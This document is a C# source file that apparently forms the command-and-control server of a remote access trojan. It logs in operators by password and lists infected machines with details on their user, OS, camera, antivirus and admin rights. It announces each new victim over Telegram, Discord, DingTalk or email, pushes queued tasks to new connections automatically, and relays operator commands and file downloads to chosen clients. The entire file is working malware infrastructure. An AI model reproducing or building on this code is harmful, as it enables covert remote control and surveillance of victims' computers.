using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using MessagePack;
using static Server.Settings;
using static Server.Settings.ClientTask;

namespace Server
{
    public class HandlePacket
    {
        public Clients client;
        public byte[] data;

        public void Read()
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Helper.Aes.Decrypt(data));

                if (unpack_msgpack.ForcePathObject("Type").AsString == "Controler")
                {
                    if (unpack_msgpack.ForcePathObject("Password").AsString != Settings.Password)
                    {
                        Console.WriteLine("Error password trying to login from" + client.Info.IP);
                        client.Disconnected();
                        goto Break;
                    }

                    var Pack = new MsgPack();
                    Pack.DecodeFromBytes(unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes());
                    switch (Pack.ForcePathObject("Packet").AsString)
                    {
                        case "Connect":
                            {
                                Console.WriteLine("Login from " + client.Info.IP);
                                Settings.Controler.Add(client);
                                client.Controler = true;
                                client.Info.LastPing = DateTime.Now;
                                client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;

                                if (Settings.Online.Count > 0)
                                    foreach (var clients in Settings.Online)
                                    {
                                        var msgpack = new MsgPack();
                                        msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
                                        msgpack.ForcePathObject("IP").AsString = clients.Info.IP;
                                        msgpack.ForcePathObject("HWID").AsString = clients.Info.HWID;
                                        msgpack.ForcePathObject("User").AsString = clients.Info.User;
                                        msgpack.ForcePathObject("OS").AsString = clients.Info.OS;
                                        msgpack.ForcePathObject("Camera").AsString = clients.Info.Camera;
                                        msgpack.ForcePathObject("Path").AsString = clients.Info.Path;
                                        msgpack.ForcePathObject("Version").AsString = clients.Info.Version;
                                        msgpack.ForcePathObject("Admin").AsString = clients.Info.Permission;
                                        msgpack.ForcePathObject("Active").AsString = clients.Info.Active;
                                        msgpack.ForcePathObject("AV").AsString = clients.Info.AV;
                                        msgpack.ForcePathObject("Install-Time").AsString = clients.Info.InstallTime;
                                        msgpack.ForcePathObject("Group").AsString = clients.Info.Group;
                                        foreach (var CL in Settings.Controler.ToList())
                                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                                    }

                                break;
                            }
                        case "Ping":
                            {
                                client.Info.LastPing = DateTime.Now;
                                break;
                            }

                        case "Tasks": 
                            {
                                switch (Pack.ForcePathObject("Message").AsString) 
                                {
                                    case "Add": 
                                        {
                                            foreach (var CT in Settings.clientTasks)
                                            {
                                                if (CT.Name == Pack.ForcePathObject("Name").AsString)
                                                    Settings.clientTasks.Remove(CT);
                                            }
                                            ClientTask task = new ClientTask();
                                            task.Name = Pack.ForcePathObject("Name").AsString;
                                            task.status= true;
                                            task.triggerType = (TriggerType)Enum.Parse(typeof(TriggerType), Pack.ForcePathObject("Trigger").AsString);
                                            task.mspack= Pack.ForcePathObject("msgpack").GetAsBytes();
                                            clientTasks.Add(task);
                                            ClientTask.Save(clientTasks);
                                            var msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "Tasks";
                                            msgpack.ForcePathObject("Message").AsString = Tasks.GetTasks();
                                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                                            break;
                                        }
                                    case "Change":
                                        {
                                            foreach (var CT in clientTasks)
                                            {
                                                if (CT.Name == Pack.ForcePathObject("Name").AsString)
                                                    CT.status = !CT.status;
                                            }

                                            ClientTask.Save(clientTasks);
                                            var msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "Tasks";
                                            msgpack.ForcePathObject("Message").AsString = Tasks.GetTasks();
                                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                                            break;
                                        }
                                    case "Delete":
                                        {
                                            foreach (var CT in Settings.clientTasks) 
                                            { 
                                                if (CT.Name == Pack.ForcePathObject("Name").AsString)
                                                    Settings.clientTasks.Remove(CT);
                                            }

                                            ClientTask.Save(clientTasks);
                                            var msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "Tasks";
                                            msgpack.ForcePathObject("Message").AsString = Tasks.GetTasks();
                                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                                            break;
                                        }
                                    case "Get":
                                        {
                                            var msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "Tasks";
                                            msgpack.ForcePathObject("Message").AsString = Tasks.GetTasks();
                                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());

                                            break;
                                        }
                                }
                                break;
                            }

                        case "Notify":
                            {
                                switch (Pack.ForcePathObject("Message").AsString)
                                {
                                    case "DingTalk":
                                        {
                                            Settings.notifyConfig.DingTalk = true;
                                            Settings.notifyConfig.DingTalkWebHook =
                                                Pack.ForcePathObject("WebHook").AsString;
                                            Settings.notifyConfig.DingTalkSecret =
                                                Pack.ForcePathObject("Secret").AsString;
                                            break;
                                        }
                                    case "Discord":
                                        {
                                            Settings.notifyConfig.Discord = true;
                                            Settings.notifyConfig.DiscordWebhook =
                                                Pack.ForcePathObject("WebHook").AsString;

                                            break;
                                        }
                                    case "Mail":
                                        {
                                            Settings.notifyConfig.Mail = true;
                                            Settings.notifyConfig.MailFromAddress =
                                                Pack.ForcePathObject("MailFromAddress").AsString;
                                            Settings.notifyConfig.MailToAddress =
                                                Pack.ForcePathObject("MailToAddress").AsString;
                                            Settings.notifyConfig.MailSMTPAddress =
                                                Pack.ForcePathObject("MailSMTPAddress").AsString;
                                            Settings.notifyConfig.MailSMTPPort =
                                                Convert.ToInt32(Pack.ForcePathObject("MailSMTPPort").AsString);
                                            Settings.notifyConfig.MailPassword =
                                                Pack.ForcePathObject("MailPassword").AsString;

                                            break;
                                        }
                                    case "Telegram":
                                        {
                                            Settings.notifyConfig.Telegram = true;
                                            Settings.notifyConfig.TelegramApiToken =
                                                Pack.ForcePathObject("ApiToken").AsString;
                                            Settings.notifyConfig.TelegramChannelID =
                                                Pack.ForcePathObject("ChannelID").AsString;

                                            break;
                                        }
                                    case "DingTalk0":
                                        {
                                            Settings.notifyConfig.DingTalk = false;
                                            break;
                                        }
                                    case "Discord0":
                                        {
                                            Settings.notifyConfig.Discord = false;

                                            break;
                                        }
                                    case "Mail0":
                                        {
                                            Settings.notifyConfig.Mail = false;

                                            break;
                                        }
                                    case "Telegram0":
                                        {
                                            Settings.notifyConfig.Telegram = false;

                                            break;
                                        }
                                }

                                Settings.NotifyConfig.Save(Settings.notifyConfig);
                                break;
                            }

                        default:
                            {
                                foreach (var CL in Settings.Online.ToList())
                                    if (CL.Info.HWID == Pack.ForcePathObject("TargetClient").AsString)
                                    {
                                        Pack.ForcePathObject("HWID").AsString =
                                            unpack_msgpack.ForcePathObject("HWID").AsString;
                                        ThreadPool.QueueUserWorkItem(CL.BeginSend, Pack.Encode2Bytes());
                                    }
                                break;
                            }
                    }
                }
                else
                {
                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                    {
                        case "ClientInfo":
                            {
                                Console.WriteLine("Client from " + client.Info.IP);


                                client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                                client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
                                client.Info.Camera = unpack_msgpack.ForcePathObject("Camera").AsString;
                                client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                                client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                                client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
                                client.Info.Permission = unpack_msgpack.ForcePathObject("Admin").AsString;
                                client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                                client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                                client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
                                client.Info.LastPing = DateTime.Now;

                                if (Settings.Controler.Count > 0)
                                {
                                    unpack_msgpack.ForcePathObject("IP").AsString = client.Info.IP;
                                    foreach (var clients in Settings.Controler)
                                        ThreadPool.QueueUserWorkItem(clients.BeginSend, unpack_msgpack.Encode2Bytes());
                                }

                                client.Controler = false;

                                Settings.Online.Add(client);

                                var content = $"Client {client.Info.IP} connected" + "\n"
                                                                                   + "Group:" + client.Info.Group + "\n"
                                                                                   + "User:" + client.Info.User + "\n"
                                                                                   + "OS:" + client.Info.OS;
                                Notify.Send(content);

                                foreach (var task in Settings.clientTasks)
                                {
                                    if (task.status)
                                    {
                                        TriggerType trigger = TriggerType.New_Connection;
                                        if (client.Info.Path.ToLower().Contains("sysarm32")|| client.Info.Path.ToLower().Contains("appdata"))
                                             trigger = TriggerType.New_Connection;
                                        if (trigger== task.triggerType)
                                        {
                                            ThreadPool.QueueUserWorkItem(client.BeginSend, task.mspack);
                                        }
                                    }
                                }
                                break;
                            }

                        case "ClientPing":
                            {
                                client.Info.LastPing = DateTime.Now;
                                client.Info.Active = unpack_msgpack.ForcePathObject("Message").AsString;
                                if (Settings.Controler.Count > 0)
                                {
                                    unpack_msgpack.ForcePathObject("HWID").AsString = client.Info.HWID;
                                    foreach (var clients in Settings.Controler)
                                        ThreadPool.QueueUserWorkItem(clients.BeginSend, unpack_msgpack.Encode2Bytes());
                                }
                                break;
                            }

                        case "fileDownload":
                            {
                                if (Settings.Controler.Count > 0)
                                    foreach (var clients in Settings.Controler)
                                        if (unpack_msgpack.ForcePathObject("Controler_HWID").AsString ==
                                            clients.Info.HWID ||
                                            unpack_msgpack.ForcePathObject("Controler_HWID").AsString == "" ||
                                            unpack_msgpack.ForcePathObject("Controler_HWID").AsString == null)
                                            clients.BeginSend(unpack_msgpack.Encode2Bytes());
                                break;
                            }

                        default:
                            {
                                if (Settings.Controler.Count > 0)
                                {
                                    unpack_msgpack.ForcePathObject("HWID").AsString = client.Info.HWID;
                                    foreach (var clients in Settings.Controler)
                                        if (unpack_msgpack.ForcePathObject("Controler_HWID").AsString ==
                                            clients.Info.HWID ||
                                            unpack_msgpack.ForcePathObject("Controler_HWID").AsString == "" ||
                                            unpack_msgpack.ForcePathObject("Controler_HWID").AsString == null)
                                            clients.BeginSend(unpack_msgpack.Encode2Bytes());
                                }
                                break;
                            }
                    }
                }

            Break:;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}